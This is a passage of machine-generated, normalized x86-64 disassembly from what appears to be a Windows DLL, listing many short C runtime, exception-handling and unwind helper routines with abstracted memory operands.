mov [ rsp + 0x10 ] rdx
push rbx
sub rsp 0x20
lea rdx [ rsp + 0x38 ]
mov rbx rcx
call sub_180018524
lea r11 [ r--data ]
mov rax rbx
mov [ rbx ] r11
add rsp 0x20
pop rbx
retn
sub_1800185c4
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800184fc
sub_180018610
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x10 ] 0x0
call sub_180018554
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001863c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_180018b3c
jmp sub_180018b3c
sub_1800189e8
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_18001d6d0
test eax eax
sete al
add rsp 0x28
retn
sub_180018bd0
mov r11 rsp
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
lea rax [ r11 + 0x20 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_18001ddc4
add rsp 0x38
retn
sub_180018bf4
test r8 r8
je r-xdata
neg r8
sbb rax rax
and rax rcx
retn
cmp [ rcx ] dl
je r-xdata
inc rcx
dec r8
jne r-xdata
sub_180018c10
sub rsp 0x28
call sub_18001e320
mov rcx [ rw-data ]
cmp [ rax + 0xc0 ] rcx
je r-xdata
mov rax [ rw-data ]
add rsp 0x28
retn
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
call sub_18001e138
sub_1800199d0
test rcx rcx
jne r-xdata
mov rax [ rcx ]
mov eax [ rax + 0x10c ]
retn
jmp sub_180019994
sub_180019c64
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001e320
mov [ rax + 0x128 ] rbx
add rsp 0x20
pop rbx
retn
sub_180019c80
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18001e320
mov [ rax + 0x130 ] rbx
add rsp 0x20
pop rbx
retn
sub_18001a3a8
sub rsp 0x28
call sub_18001a29c
neg rax
sbb eax eax
neg eax
dec eax
add rsp 0x28
retn
sub_18001b4d4
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_18001b470
mov eax 0x1
add rsp 0x28
retn
sub_18001b5e8
sub rsp 0x38
cmp r9d 0xa
jne r-xdata
and [ rsp + 0x20 ] 0x0
test ecx ecx
jns r-xdata
mov [ rsp + 0x20 ] 0x1
jmp r-xdata
call sub_18001b4f4
add rsp 0x38
retn
sub_18001b708
sub rsp 0x38
and [ rsp + 0x20 ] 0x0
call sub_18001b610
add rsp 0x38
retn
sub_18001bd48
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_1800185c4
sub_18001c0cf
call sub_180021224
sub_18001c100
sub rsp 0x28
call sub_18001e320
xor ecx ecx
cmp [ rax + 0x100 ] ecx
setne al
add rsp 0x28
retn
sub_18001c5e4
call sub_180021224
sub_18001c6a2
call sub_180021224
sub_18001ce84
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180018610
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
j_sub_18001d0d0
jmp sub_18001d0d0
sub_18001d43c
xor r8d r8d
jmp sub_18001d2d0
sub_18001d484
mov eax [ rw-data ]
mov r8d edx
and ecx edx
not r8d
and r8d eax
or r8d ecx
mov [ rw-data ] r8d
retn
sub_18001d778
sbb rax rax
sbb rax 0xffffffffffffffff
retn
sub_18001d780
mov [ rw-data ] rcx
retn
sub_18001d8bc
mov [ rw-data ] rcx
retn
sub_18001db2c
sub rsp 0x28
mov rcx [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
add rsp 0x28
retn
sub_18001e1bc
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
add rsp 0x28
jmp sub_180022cb0
call [ FlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_18001ed5c
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov ecx 0xfffffffd
call sub_18001eb7c
mov [ rw-data ] 0x1
sub_18001f68c
movsd [ rsp + 0x8 ] xmm0
mov rdx 0x8000000000000000
mov rcx [ rsp + 0x8 ]
movsd [ rsp + 0x8 ] xmm1
mov rax [ rsp + 0x8 ]
xor rax rcx
test rdx rax
je r-xdata
retn
xor rcx rdx
mov [ rsp + 0x8 ] rcx
movsd xmm0 [ rsp + 0x8 ]
sub_18001f8b0
sub rsp 0x28
call sub_180026b60
and eax 0x3f
add rsp 0x28
retn
sub_18001f8c4
push rbx
sub rsp 0x20
call sub_180026b60
mov ebx eax
and ebx 0x3f
call sub_180026b7a
mov eax ebx
add rsp 0x20
pop rbx
retn
sub_18001f960
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180026b60
and ebx 0x3f
or eax ebx
mov ecx eax
add rsp 0x20
pop rbx
jmp sub_180026b70
sub_18001fbbc
push rbx
sub rsp 0x20
mov ebx ecx
call sub_18001fb80
mov ecx ebx
call [ ExitProcess@IAT ]
sub_18001fbd4
mov ecx 0x8
jmp sub_180022e38
sub_18001fbe0
mov ecx 0x8
jmp sub_180022d38
sub_18001fee0
xor r8d r8d
lea edx [ r8 + 0x1 ]
jmp sub_18001fd50
sub_18001feec
xor edx edx
xor ecx ecx
lea r8d [ rdx + 0x1 ]
jmp sub_18001fd50
sub_18001fefc
push rbx
sub rsp 0x20
mov ebx ecx
call sub_1800210b0
mov ecx ebx
call sub_180020e50
xor r8d r8d
mov ecx 0xff
lea edx [ r8 + 0x1 ]
call sub_18001fd50
int3
sub_180020998
mov eax 0xe06d7363
cmp ecx eax
jne r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_1800207c8
sub_180020e1c
mov [ rw-data ] rcx
retn
sub_180021180
mov r8 [ rdx ]
jmp sub_1800210f4
sub_180021188
sub rsp 0x28
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov r10 r8
mov eax [ r9 + rax ]
cmp eax 0xfffffffe
jne r-xdata
add rsp 0x28
retn
mov r8 [ rdx ]
mov rcx r10
call sub_1800210f4
sub_1800211b0
movsxd rdx [ r8 + 0x1c ]
mov rax [ rcx ]
mov [ rdx + rax ] r9d
retn
sub_1800211f8
push rbx
sub rsp 0x20
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_180019b48
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
mov eax [ rax + rcx + 0x4 ]
add rsp 0x20
pop rbx
retn
sub_180021224
sub rsp 0x28
call sub_18001e320
mov rcx [ rax + 0xd0 ]
test rcx rcx
je r-xdata
call sub_18001d444
call rcx
jmp r-xdata
sub_180021242
add rsp 0x28
retn
sub_180021248
sub rsp 0x28
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call sub_180021224
call rax
jmp r-xdata
sub_180021268
add rsp 0x28
retn
sub_180021270
sub rsp 0x28
lea rcx [ sub_180021224 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_180021290
lea rax [ rw-data ]
retn
sub_180021298
lea rax [ rw-data ]
retn
sub_180022d38
movsxd rcx ecx
lea rax [ rw-data ]
add rcx rcx
mov rcx [ rax + rcx * 8 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180023b74
xor r8d r8d
mov eax r8d
test rdx rdx
je r-xdata
retn
cmp [ rcx ] r8w
je r-xdata
inc rax
add rcx 0x2
cmp rax rdx
jb r-xdata
sub_180023eb0
mov rax [ rsp ]
mov [ rcx ] rax
retn
sub_180023eb8
neg rcx
sbb eax eax
and eax 0x1
retn
sub_180023ee0
sub rsp 0x4d8
xor r8 r8
xor r9 r9
mov [ rsp + 0x20 ] rsp
mov [ rsp + 0x28 ] r8
call RtlUnwindEx
add rsp 0x4d8
retn
sub_180023f10
mov [ rsp + 0x8 ] rcx
mov [ rsp + 0x18 ] rdx
mov [ rsp + 0x10 ] r8d
mov r9 0x19930520
jmp sub_180023f30
sub_180023f30
retn
sub_180023f40
retn
sub_180024064
movsd xmm0 [ rcx ]
comisd xmm0 [ r--data ]
jb r-xdata
xor eax eax
retn
mov eax 0x1
retn
sub_1800240c0
xor r9d r9d
jmp sub_18002407c
sub_1800240c8
xor edx edx
jmp sub_180023f44
sub_1800240d0
xor edx edx
jmp sub_180023fc4
sub_180024c20
sub rsp 0x48
mov eax [ rsp + 0x78 ]
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] eax
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] eax
call sub_180024b88
add rsp 0x48
retn
sub_180024dd4
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
mov [ rw-data ] rcx
retn
sub_180024df4
mov rcx [ rw-data ]
jmp [ DecodePointer@IAT ]
sub_180025038
and [ rw-data ] 0x0
retn
sub_180025ab0
lea rax [ rw-data ]
retn
sub_180025b98
sub rsp 0x28
call sub_1800293d0
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
add rsp 0x28
jmp sub_180018b3c
call sub_180029170
sub_180025ca4
cmp ecx 0x14
jge r-xdata
lea rcx [ rdx + 0x30 ]
jmp [ LeaveCriticalSection@IAT ]
btr [ rdx + 0x18 ] 0xf
add ecx 0x10
jmp sub_180022d38
sub_180025cc4
sub rsp 0x28
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x1c ]
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
or eax 0xffffffff
jmp r-xdata
add rsp 0x28
retn
sub_180025cec
mov rcx [ rw-data ]
xor eax eax
or rcx 0x1
cmp [ rw-data ] rcx
sete al
retn
sub_180026b48
xor eax eax
retn
sub_180026b60
sub rsp 0x8
stmxcsr [ rsp ]
mov eax [ rsp ]
add rsp 0x8
retn
sub_180026b70
mov [ rsp + 0x8 ] ecx
ldmxcsr [ rsp + 0x8 ]
retn
sub_180026b7a
stmxcsr [ rsp + 0x8 ]
mov ecx 0xffffffc0
and [ rsp + 0x8 ] ecx
ldmxcsr [ rsp + 0x8 ]
retn
sub_180026b8e
ucomisd xmm0 [ r--data ]
jae r-xdata
retn
ucomisd xmm0 [ r--data ]
jbe r-xdata
cvtsd2si rcx xmm0
cvtsi2sd xmm0 rcx
sub_180026c74
mov [ rw-data ] rcx
retn
sub_180026cf8
mov edx ecx
mov r9d 0x4
xor r8d r8d
xor ecx ecx
jmp sub_180026c7c
sub_18002715c
mov rax rcx
movzx edx [ rax ]
add rax 0x2
test dx dx
jne r-xdata
sub rax rcx
sar rax 0x1
dec rax
retn
sub_180027380
xor edx edx
lea r8d [ rdx + 0xa ]
jmp sub_180029648
sub_180028f6c
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
lea rcx [ rax + rdx + 0x10 ]
jmp [ LeaveCriticalSection@IAT ]
sub_180029168
xor r9d r9d
jmp sub_180028ff0
sub_1800293d0
mov ecx 0x1
jmp sub_1800292e4
sub_18002a34c
sub rsp 0x48
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
mov r8d 0x3
lea rcx [ r--data ]
xor r9d r9d
mov edx 0x40000000
mov [ rsp + 0x20 ] r8d
call [ CreateFileW@IAT ]
mov [ rw-data ] rax
add rsp 0x48
retn
sub_18002a388
sub rsp 0x28
mov rcx [ rw-data ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
RtlPcToFileHeader
jmp [ RtlPcToFileHeader@IAT ]
RtlLookupFunctionEntry
jmp [ RtlLookupFunctionEntry@IAT ]
RtlUnwindEx
jmp [ RtlUnwindEx@IAT ]
RtlVirtualUnwind
jmp [ RtlVirtualUnwind@IAT ]
sub_18002a7d0
lea rcx [ rdx + 0x58 ]
jmp sub_18001778c
sub_18002a7dc
mov rcx [ rdx + 0x40 ]
jmp sub_180003160
sub_18002a7ec
mov rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_180003d50
sub_18002a7fc
lea rcx [ rdx + 0x48 ]
jmp sub_18001778c
sub_18002a808
lea rcx [ rdx + 0x40 ]
jmp sub_18001778c
sub_18002a814
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x40 ] 0x0
jne r-xdata
add rsp 0x20
pop rbp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_18001e1bc
nop
sub_18002a83a
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_180020998
nop
add rsp 0x20
pop rbp
retn
sub_18002a89e
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18001fbe0
nop
add rsp 0x20
pop rbp
retn
sub_18002a8b4
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002a8d4
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002a8ef
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002a90f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002a92f
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rbp + 0x60 ]
and [ rax + 0xc8 ] 0xffffffef
add rsp 0x20
pop rbp
retn
sub_18002a94a
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18001beb8
nop
add rsp 0x20
pop rbp
retn
sub_18002a96a
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18001e320
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_18001e320
dec [ rax + 0x100 ]
sub_18002a993
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_18002ab3a
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002ab55
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002ab70
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002abb7
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_180022d38
nop
sub_18002abdb
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
nop
add rsp 0x20
pop rbp
retn
sub_18002abf9
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x60 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
xor ecx ecx
call sub_180022d38
nop
sub_18002ac17
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_180028f6c
nop
add rsp 0x20
pop rbp
retn
sub_18002ac30
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_18002ac52
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002ac6d
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002ac88
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_180025ca4
nop
add rsp 0x20
pop rbp
retn
sub_18002acb8
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_180022d38
nop
add rsp 0x20
pop rbp
retn
sub_18002acd3
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call sub_180025c58
nop
add rsp 0x20
pop rbp
retn
sub_18002aced
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x40 ]
call sub_180028f6c
nop
add rsp 0x20
pop rbp
retn
sub_18002ad10
mov rcx [ rdx + 0x40 ]
jmp sub_18001778c
sub_18002ad20
mov rcx [ rdx + 0x40 ]
add rcx 0x8
jmp sub_180003d50
sub_18002ad30
mov rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_180003d50
sub_18002ad40
mov rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_180003d50
sub_18002ad50
mov rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_180003d50
sub_18002ae30
mov rcx [ rdx + 0xd0 ]
jmp sub_180003160
sub_18002ae40
lea rcx [ rdx + 0x40 ]
jmp sub_18001778c
sub_18002ae50
lea rcx [ rdx + 0x40 ]
add rcx 0x8
jmp sub_180003d50
sub_18002ae60
lea rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_180003d50
sub_18002ae70
lea rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_180003d50
sub_18002ae80
lea rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_180003d50
sub_18002ae90
mov rcx [ rdx + 0xd0 ]
jmp j_sub_180018b3c
sub_18002aea0
lea rcx [ rdx + 0x40 ]
jmp sub_18001778c
sub_18002aeb0
lea rcx [ rdx + 0x40 ]
add rcx 0x8
jmp sub_180003d50
sub_18002aec0
lea rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_180003d50
sub_18002aed0
lea rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_180003d50
sub_18002aee0
lea rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_180003d50
sub_18002aef0
lea rcx [ rdx + 0x40 ]
jmp sub_18001778c
sub_18002af00
lea rcx [ rdx + 0x40 ]
add rcx 0x8
jmp sub_180003d50
sub_18002af10
lea rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_180003d50
sub_18002af20
lea rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_180003d50
sub_18002af30
lea rcx [ rdx + 0x40 ]
add rcx 0x38
jmp sub_180003d50
sub_18002af40
lea rcx [ rdx + 0x68 ]
jmp sub_18001778c
sub_18002af50
mov rcx [ rdx + 0x50 ]
add rcx 0x8
jmp sub_1800177dc
sub_18002b0f0
lea rcx [ rdx + 0x88 ]
jmp sub_180003170
sub_18002b100
lea rcx [ rdx + 0xd0 ]
jmp sub_180001f10
sub_18002b110
lea rcx [ rdx + 0xa8 ]
jmp sub_180001f10
sub_18002b120
lea rcx [ rdx + 0x78 ]
jmp sub_180003170
sub_18002b130
lea rcx [ rdx + 0xb0 ]
jmp sub_180001f10
sub_18002b140
lea rcx [ rdx + 0x88 ]
jmp sub_180001f10
sub_18002b150
lea rcx [ rdx + 0xa0 ]
jmp sub_180001f10
sub_18002b160
lea rcx [ rdx + 0x78 ]
jmp sub_180001f10
sub_18002b170
lea rcx [ rdx + 0x38 ]
jmp sub_180003170
sub_18002b180
lea rcx [ rdx + 0x40 ]
jmp sub_180003170
sub_18002b190
mov rcx [ rdx + 0x40 ]
sub rcx 0x88
add rcx 0x8
jmp sub_180003d80
sub_18002b1b0
lea rcx [ rdx + 0xa8 ]
jmp sub_180003170
sub_18002b1c0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001f10
sub_18002b1d0
lea rcx [ rdx + 0xc8 ]
jmp sub_180001f10
sub_18002b1e0
lea rcx [ rdx + 0x50 ]
jmp sub_180003170
sub_18002b1f0
mov rcx [ rdx + 0x38 ]
jmp sub_180001f50
sub_18002b200
lea rcx [ rdx + 0x40 ]
jmp sub_180001f50
sub_18002b210
lea rcx [ rdx + 0x38 ]
jmp sub_180003170
sub_18002b220
lea rcx [ rdx + 0x68 ]
jmp sub_180001f50
sub_18002b230
lea rcx [ rdx + 0x90 ]
jmp sub_180001f50
sub_18002b240
lea rcx [ rdx + 0x90 ]
jmp sub_180001f50
sub_18002b250
lea rcx [ rdx + 0x48 ]
jmp sub_180003170
sub_18002b260
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002b280
lea rcx [ rdx + 0x30 ]
jmp sub_180003170
sub_18002b290
lea rcx [ rdx + 0x68 ]
jmp sub_180001f50
sub_18002b2a0
lea rcx [ rdx + 0x90 ]
jmp sub_180001f50
sub_18002b2b0
lea rcx [ rdx + 0x90 ]
jmp sub_180001f50
sub_18002b2c0
mov rcx [ rdx + 0x40 ]
jmp sub_1800072a0
sub_18002b2d0
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b2e0
lea rcx [ rdx + 0x50 ]
jmp sub_180006300
sub_18002b2f0
lea rcx [ rdx + 0x30 ]
jmp sub_180003170
sub_18002b360
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b370
mov rcx [ rdx + 0x38 ]
jmp sub_180001f50
sub_18002b380
mov rcx [ rdx + 0x30 ]
jmp sub_180001f50
sub_18002b390
mov rcx [ rdx + 0x20 ]
add rcx 0x10
jmp sub_180001f50
sub_18002b3a0
lea rcx [ rdx + 0x68 ]
jmp sub_180003170
sub_18002b400
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b410
lea rcx [ rdx + 0x50 ]
jmp sub_180006300
sub_18002b420
lea rcx [ rdx + 0x30 ]
jmp sub_180003170
sub_18002b490
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b4d0
lea rcx [ rdx + 0x70 ]
jmp sub_1800072a0
sub_18002b4e0
lea rcx [ rdx + 0x70 ]
jmp sub_1800072a0
sub_18002b4f0
lea rcx [ rdx + 0x40 ]
jmp sub_180003170
sub_18002b560
lea rcx [ rdx + 0x70 ]
jmp sub_1800072a0
sub_18002b570
lea rcx [ rdx + 0x70 ]
jmp sub_1800072a0
sub_18002b580
lea rcx [ rdx + 0x40 ]
jmp sub_180003170
sub_18002b5f0
lea rcx [ rdx + 0x70 ]
jmp sub_1800072a0
sub_18002b600
lea rcx [ rdx + 0x70 ]
jmp sub_1800072a0
sub_18002b610
lea rcx [ rdx + 0x40 ]
jmp sub_180003170
sub_18002b680
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002b690
lea rcx [ rdx + 0x28 ]
jmp sub_180006300
sub_18002b6f0
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002b700
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002b710
lea rcx [ rdx + 0x28 ]
jmp sub_180006300
sub_18002b770
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002b780
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b790
lea rcx [ rdx + 0x50 ]
jmp sub_180006300
sub_18002b7a0
lea rcx [ rdx + 0x30 ]
jmp sub_180003170
sub_18002b810
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b820
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b830
lea rcx [ rdx + 0x50 ]
jmp sub_180006300
sub_18002b840
lea rcx [ rdx + 0x30 ]
jmp sub_180003170
sub_18002b8b0
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b8c0
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b8d0
lea rcx [ rdx + 0x50 ]
jmp sub_180006300
sub_18002b8e0
lea rcx [ rdx + 0x30 ]
jmp sub_180003170
sub_18002b950
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b960
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002b970
lea rcx [ rdx + 0x50 ]
jmp sub_180006300
sub_18002b980
lea rcx [ rdx + 0x30 ]
jmp sub_180003170
sub_18002b9f0
lea rcx [ rdx + 0x50 ]
jmp sub_1800072a0
sub_18002ba00
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002ba10
lea rcx [ rdx + 0x28 ]
jmp sub_180006300
sub_18002ba70
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002ba80
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002ba90
lea rcx [ rdx + 0x28 ]
jmp sub_180006300
sub_18002baf0
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002bb00
lea rcx [ rdx + 0x30 ]
jmp sub_180001f50
sub_18002bb10
lea rcx [ rdx + 0x30 ]
jmp sub_180001f50
sub_18002bb20
lea rcx [ rdx + 0x30 ]
jmp sub_180001f50
sub_18002bb30
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002bb40
lea rcx [ rdx + 0x28 ]
jmp sub_1800072a0
sub_18002bbb0
lea rcx [ rdx + 0x40 ]
jmp sub_1800072a0
sub_18002bbc0
lea rcx [ rdx + 0x40 ]
jmp sub_1800072a0
sub_18002bbd0
lea rcx [ rdx + 0x28 ]
jmp sub_180003170
sub_18002bc70
mov rcx [ rdx + 0x50 ]
add rcx 0x10
jmp sub_180003e20
sub_18002bc80
mov rcx [ rdx + 0x50 ]
add rcx 0x18
jmp sub_1800044d0
sub_18002bc90
mov rcx [ rdx + 0x60 ]
jmp sub_180003e40
sub_18002bca0
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x60 ]
mov rcx [ rbp + 0x28 ]
call sub_180004200
add rsp 0x20
pop rbp
retn
sub_18002bd20
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x58 ]
call j_sub_180018b3c
xor edx edx
xor ecx ecx
call sub_180019410
nop
sub_18002bd40
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x40 ]
mov rcx [ rbp + 0x48 ]
call sub_180004200
add rsp 0x20
pop rbp
retn
sub_18002bd60
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x40 ]
mov rcx [ rbp + 0x48 ]
call sub_180004200
add rsp 0x20
pop rbp
retn
sub_18002bd80
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x70 ]
mov rcx [ rbp + 0x28 ]
call sub_180004200
add rsp 0x20
pop rbp
retn
sub_18002be00
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x58 ]
call j_sub_180018b3c
xor edx edx
xor ecx ecx
call sub_180019410
nop
sub_18002be50
mov rcx [ rdx + 0x40 ]
add rcx 0x8
jmp sub_180003d80
sub_18002be60
mov rcx [ rdx + 0x28 ]
jmp sub_180003e40
sub_18002bea0
lea rcx [ rdx + 0x30 ]
add rcx 0x8
jmp sub_180003d80
sub_18002beb0
mov rcx [ rdx + 0x1a0 ]
jmp sub_180003e40
sub_18002bec0
lea rcx [ rdx + 0x30 ]
jmp sub_180009d40
sub_18002bf40
lea rcx [ rdx + 0x20 ]
add rcx 0x8
jmp sub_180003d80
sub_18002bf50
mov rcx [ rdx + 0x128 ]
jmp sub_180003e40
sub_18002bf60
lea rcx [ rdx + 0x20 ]
jmp sub_180009d40
sub_18002c000
lea rcx [ rdx + 0x30 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c010
mov rcx [ rdx + 0x3d0 ]
jmp sub_180003e40
sub_18002c020
lea rcx [ rdx + 0x30 ]
jmp sub_180009d40
sub_18002c030
lea rcx [ rdx + 0x2b8 ]
jmp sub_180001f50
sub_18002c070
lea rcx [ rdx + 0x30 ]
add rcx 0x8
jmp sub_180003d80
sub_18002c080
mov rcx [ rdx + 0x3d8 ]
jmp sub_180003e40
sub_18002c090
lea rcx [ rdx + 0x30 ]
jmp sub_180009d40
sub_18002c0a0
lea rcx [ rdx + 0x308 ]
jmp sub_180001f50
sub_18002c0b0
lea rcx [ rdx + 0x2e0 ]
jmp sub_180001f50
sub_18002c0c0
lea rcx [ rdx + 0x358 ]
jmp sub_180001f50
sub_18002c0d0
lea rcx [ rdx + 0x1a0 ]
jmp sub_180001f50
sub_18002c0e0
lea rcx [ rdx + 0x330 ]
jmp sub_180001f50
sub_18002c0f0
lea rcx [ rdx + 0x1f0 ]
jmp sub_180001f50
sub_18002c100
lea rcx [ rdx + 0x150 ]
jmp sub_180001f50
sub_18002c110
lea rcx [ rdx + 0x240 ]
jmp sub_180001f50
sub_18002c120
lea rcx [ rdx + 0x380 ]
jmp sub_180001f50
sub_18002c130
lea rcx [ rdx + 0x290 ]
jmp sub_180001f50
sub_18002c140
lea rcx [ rdx + 0x178 ]
jmp sub_180001f50
sub_18002c150
lea rcx [ rdx + 0x1c8 ]
jmp sub_180001f50
sub_18002c160
lea rcx [ rdx + 0x218 ]
jmp sub_180001f50
sub_18002c170
lea rcx [ rdx + 0x268 ]
jmp sub_180001f50
sub_18002c180
lea rcx [ rdx + 0x3a8 ]
jmp sub_180001f50
sub_18002c1c0
mov rcx [ rdx + 0x40 ]
add rcx 0x10
jmp sub_180003e20
sub_18002c1d0
mov rcx [ rdx + 0x40 ]
add rcx 0x18
jmp sub_1800044d0
sub_18002c1e0
